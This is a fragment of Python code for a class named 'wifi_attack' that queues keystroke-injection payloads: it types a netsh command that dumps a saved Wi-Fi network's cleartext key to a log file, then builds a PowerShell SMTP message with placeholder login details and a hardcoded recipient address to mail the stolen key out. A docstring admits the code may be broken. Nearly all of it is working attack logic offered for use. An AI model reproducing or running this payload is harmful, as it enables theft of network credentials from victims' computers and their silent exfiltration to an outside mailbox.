...
"""
this attack code need to be fixed, and may not work.
please change "YOUR EMAIL" and "YOUR PASSWORD" in init_list function before run this attack.
"""
...
class wifi_attack:
    ...
    def init_list(self):
        ...
        add_payload.wait(self.payloads_list, 1)
        add_payload.StringPL(self.payloads_list, 'netsh wlan show profile "bara" key=clear >c:\\WINDOWS\\system32\\log.txt')
        ...
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list,
                             "$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR EMAIL', 'YOUR PASSWORDs');")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        ...
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$ReportEmail.To.Add('mhmdassi@hotmail.com')")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
